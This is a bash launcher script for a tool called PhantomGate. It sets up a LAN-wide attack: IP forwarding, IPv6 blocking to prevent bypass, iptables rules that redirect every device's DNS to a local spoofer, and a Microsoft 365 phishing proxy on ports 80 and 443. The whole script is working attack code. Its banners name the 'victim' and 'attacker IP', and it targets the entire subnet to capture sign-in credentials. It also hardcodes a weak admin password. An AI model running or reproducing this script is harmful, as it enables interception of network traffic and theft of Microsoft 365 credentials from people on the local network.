#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════
#  PhantomGate — LAN Intercept Full Launcher
#  Usage: sudo ./start_lan.sh
# ═══════════════════════════════════════════════════════

set -e

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

cd "$(dirname "$0")"

# ── Must be root ──────────────────────────────────────
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] Run with sudo: sudo ./start_lan.sh${NC}"
    exit 1
fi

# ── Cleanup on exit ───────────────────────────────────
PIDS=()
cleanup() {
    echo ""
    echo -e "${YELLOW}[!] Shutting down...${NC}"
    for pid in "${PIDS[@]}"; do kill "$pid" 2>/dev/null || true; done
    # Remove iptables rules
    iptables -t nat -D PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null || true
    iptables -t nat -D PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 53 2>/dev/null || true
    ip6tables -D FORWARD -j DROP 2>/dev/null || true
    echo -e "${GREEN}[+] Cleaned up. Goodbye.${NC}"
}
trap cleanup EXIT INT TERM

clear
echo -e "${RED}"
echo "   ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗"
echo "   ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║"
echo "   ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║"
echo "   ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║"
echo "   ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║"
echo "   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝"
echo -e "${NC}"
echo -e "  ${BOLD}LAN Intercept Mode — Full Auto Launcher${NC}"
echo ""

# ── Auto-detect network ───────────────────────────────
IFACE=$(ip route show default 2>/dev/null | awk '/default/ {print $5}' | head -1)
GATEWAY=$(ip route show default 2>/dev/null | awk '/default/ {print $3}' | head -1)
LOCAL_IP=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1)

echo -e "  ${CYAN}Network detected:${NC}"
echo -e "    Interface : ${BOLD}$IFACE${NC}"
echo -e "    Your IP   : ${BOLD}$LOCAL_IP${NC}"
echo -e "    Gateway   : ${BOLD}$GATEWAY${NC}"
echo ""

# ── Step 1: Enable IP forwarding ─────────────────────
echo -e "  ${CYAN}[1/5]${NC} Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward
echo -e "  ${GREEN}[+] IP forwarding ON${NC}"

# ── Step 2: Block IPv6 (prevent bypass) ──────────────
echo -e "  ${CYAN}[2/5]${NC} Blocking IPv6 to force IPv4 DNS..."
ip6tables -I FORWARD -j DROP 2>/dev/null || true
ip6tables -I OUTPUT -d 2603::/16 -j DROP 2>/dev/null || true
ip6tables -I OUTPUT -d 2401::/16 -j DROP 2>/dev/null || true
echo -e "  ${GREEN}[+] IPv6 blocked${NC}"

# ── Step 3: iptables — redirect victim DNS to us ──────
echo -e "  ${CYAN}[3/5]${NC} Redirecting victim DNS queries to PhantomGate..."
# Remove old rules first to avoid duplicates
iptables -t nat -D PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null || true
iptables -t nat -D PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 53 2>/dev/null || true
# Add fresh rules
iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 53
echo -e "  ${GREEN}[+] DNS redirect rules applied${NC}"

# ── Step 4: Kill anything on used ports ──────────────
for port in 80 443 8443 53; do
    pid=$(ss -tlnp 2>/dev/null | grep ":${port} " | grep -oP 'pid=\K[0-9]+' | head -1)
    [ -n "$pid" ] && kill "$pid" 2>/dev/null || true
    pid=$(ss -ulnp 2>/dev/null | grep ":${port} " | grep -oP 'pid=\K[0-9]+' | head -1)
    [ -n "$pid" ] && [ "$pid" != "7889" ] && kill "$pid" 2>/dev/null || true
done
sleep 1

# ── Step 5a: Start DNS Spoofer ────────────────────────
echo -e "  ${CYAN}[4/5]${NC} Starting DNS spoofer on port 53..."
python3 /home/we/PhantomGate/dns_spoofer.py &>/tmp/dns_spoofer.log &
PIDS+=($!)
sleep 1

if ss -ulnp | grep -q ':53 '; then
    echo -e "  ${GREEN}[+] DNS spoofer running — all queries -> $LOCAL_IP${NC}"
else
    echo -e "  ${RED}[!] DNS spoofer failed to bind port 53${NC}"
    cat /tmp/dns_spoofer.log
    exit 1
fi

# ── Step 5b: Start PhantomGate ────────────────────────
echo -e "  ${CYAN}[5/5]${NC} Starting PhantomGate (Microsoft 365 phishlet)..."
mkdir -p data

./bin/phantomgate \
    --domain lan.local \
    --phishlet "Microsoft 365" \
    --https-port 443 \
    --http-port 80 \
    --admin-port 8443 \
    --admin-pass "phantom123" \
    --phishlet-dir phishlets \
    --store data/lan_m365.json \
    --intercept \
    &>/tmp/phantomgate_lan.log &
PIDS+=($!)
sleep 2

if ss -tlnp | grep -q ':443 '; then
    echo -e "  ${GREEN}[+] PhantomGate LIVE on port 443${NC}"
else
    echo -e "  ${RED}[!] PhantomGate failed to start${NC}"
    cat /tmp/phantomgate_lan.log | tail -10
    exit 1
fi

# ── Status Banner ─────────────────────────────────────
echo ""
echo -e "  ${GREEN}${BOLD}══════════════════════════════════════════${NC}"
echo -e "  ${GREEN}${BOLD}   PHANTOMGATE IS LIVE — LAN INTERCEPT    ${NC}"
echo -e "  ${GREEN}${BOLD}══════════════════════════════════════════${NC}"
echo ""
echo -e "  ${BOLD}Target Phishlet :${NC} Microsoft 365"
echo -e "  ${BOLD}Attacker IP     :${NC} $LOCAL_IP"
echo -e "  ${BOLD}Intercepting    :${NC} Entire subnet (all devices)"
echo ""
echo -e "  ${BOLD}Dashboard URL   :${NC} ${CYAN}http://$LOCAL_IP:8443${NC}"
echo -e "  ${BOLD}Dashboard Pass  :${NC} ${BOLD}phantom123${NC}"
echo ""
echo -e "  ${YELLOW}Verify on VICTIM machine:${NC}"
echo -e "    nslookup login.microsoftonline.com"
echo -e "    ${BOLD}Expected:${NC} Address = $LOCAL_IP"
echo ""
echo -e "  ${CYAN}Logs:${NC}"
echo -e "    PhantomGate : tail -f /tmp/phantomgate_lan.log"
echo -e "    DNS Spoofer : tail -f /tmp/dns_spoofer.log"
echo ""
echo -e "  ${BOLD}Press Ctrl+C to stop everything.${NC}"
echo ""

# Stream live logs
tail -f /tmp/phantomgate_lan.log /tmp/dns_spoofer.log 2>/dev/null &
PIDS+=($!)
wait
